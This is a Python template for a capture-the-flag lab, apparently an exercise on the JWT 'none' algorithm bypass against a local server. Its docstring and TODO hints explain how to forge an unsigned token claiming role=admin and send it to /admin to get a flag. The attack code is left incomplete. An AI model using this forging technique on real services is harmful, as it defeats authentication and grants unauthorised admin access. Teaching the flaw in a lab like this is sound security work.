"""
Challenge 01 — JWT None Algorithm Bypass
=========================================
Target : http://127.0.0.1:5001/admin

Background
----------
A JWT (JSON Web Token) has three parts separated by dots:

    header.payload.signature

Each part is base64url-encoded. Normally the server verifies the
signature using a secret key. But this server accepts alg=none —
meaning NO signature is required at all.

Your goal: forge a JWT that claims role=admin with no valid signature,
and send it to /admin to retrieve the flag.

Tasks
-----
  TODO 1 — Complete b64url_encode() to base64url-encode a dict
  TODO 2 — Fill in the correct header dict  (alg must be "none")
  TODO 3 — Fill in the payload dict         (role must be "admin")
  TODO 4 — Assemble the token in the correct JWT format
  TODO 5 — Decode the base64 flag from the response

Hint: a JWT with alg=none looks like:   header.payload.
      (two dots, empty string after the second dot = no signature)
"""

import base64
import json
import urllib.request
import urllib.error


def b64url_encode(data: dict) -> str:
    """Base64url-encode a dict (no padding)."""
    # TODO 1 — JSON-encode data, base64url-encode it, strip '=' padding
    # Hint: base64.urlsafe_b64encode(...).rstrip(b"=").decode()
    pass


def forge_token(header: dict, payload: dict) -> str:
    """Build a JWT string with an empty signature."""
    h = b64url_encode(header)
    p = b64url_encode(payload)
    # TODO 4 — Return the correct JWT format: "header.payload.signature"
    #           For alg=none the signature is an empty string
    pass


def http_get(url, headers):
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def main():
    TARGET = "http://127.0.0.1:5001/admin"

    print("=" * 55)
    print("  Challenge 01 — JWT None Algorithm Bypass")
    print("=" * 55)

    # TODO 2 — What algorithm should the header claim?
    header = {
        "alg": "???",   # <-- fix this
        "typ": "JWT"
    }

    # TODO 3 — What role does the server check for?
    payload = {
        "role": "???",  # <-- fix this
        "user": "hacker"
    }

    token = forge_token(header, payload)
    print(f"\n[*] Forged token: {token}\n")

    resp = http_get(TARGET, {"Authorization": f"Bearer {token}"})
    print(f"[*] Response: {resp}\n")

    if "flag" in resp:
        # TODO 5 — The flag is base64-encoded. Decode it.
        raw_flag = resp["flag"]
        flag = "???"  # <-- decode raw_flag here
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] No flag yet — check your token.")


if __name__ == "__main__":
    main()